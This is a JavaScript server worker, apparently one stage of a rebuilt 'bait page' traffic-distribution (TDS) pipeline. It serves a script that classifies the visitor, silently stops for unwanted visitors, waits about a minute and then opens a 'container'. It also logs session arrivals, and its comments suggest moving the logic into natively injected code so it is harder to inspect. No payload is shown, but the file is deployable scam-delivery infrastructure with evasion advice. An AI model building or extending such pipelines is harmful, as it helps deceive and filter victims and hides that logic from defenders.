// §8 — the finisher. Correction per docs/build-spec.md §8: in the original,
// this stage's three functions (initializeSparklingContainer,
// openSparklingContainer, waitOneMinute) are called but never defined
// anywhere in the web-delivered pipeline — almost certainly native-injected,
// meaning the real finishing/timing decision likely lives in Swift, not here.
//
// This scaffold takes the simpler, fully-web path instead: this lane defines
// its own version of those three names, calling directly into §6's
// classify() and §7's openContainer(). Move this logic into a native
// WKUserScript-injected API later if you want the harder-to-inspect version
// the original evidence points to.

import { corsHeaders, handleOptions } from '../../shared/cors.mjs';

function buildDeliveredScript(env) {
  const delayMs = Number(env.REVEAL_DELAY_MS || 60000);

  return `
// TODO: for a tighter perceived wait, start this clock earlier — e.g. in the
// bait page's orchestrator (bait-page/public/index.html) right after
// requestEntryBootstrap() — rather than only once this lane's script runs.
const __tdsClock = new Promise((resolve) => setTimeout(resolve, ${delayMs}));

function initializeSparklingContainer() {
  if (typeof classify !== 'function') {
    console.log('[tds] classify() not loaded — did lane-3-classify run first?');
    return false;
  }
  return classify();
}

function openSparklingContainer(state) {
  if (typeof openContainer !== 'function') {
    console.log('[tds] openContainer() not loaded — did lane-4-container run first?');
    return;
  }
  openContainer(state);
}

(async function finish() {
  const state = initializeSparklingContainer();
  if (!state) return; // silent bail — matches the original's behavior
  await __tdsClock;
  openSparklingContainer(state);
})();
`.trim();
}

export default {
  async fetch(request, env) {
    const allowedOrigin = env.ALLOWED_ORIGIN || 'https://REPLACE-bait-page.pages.dev';

    if (request.method === 'OPTIONS') return handleOptions(request, allowedOrigin);
    if (request.method !== 'POST') return new Response('Method not allowed', { status: 405 });

    const body = await request.json().catch(() => ({}));
    env.TDS_ANALYTICS?.writeDataPoint({
      indexes: [body._sessionRef || ''],
      blobs: ['lane-5-arrived'],
      doubles: [Date.now()],
    });

    const code = buildDeliveredScript(env);
    return new Response(code, {
      status: 200,
      headers: { ...corsHeaders(request, allowedOrigin), 'Content-Type': 'application/javascript' },
    });
  },
};
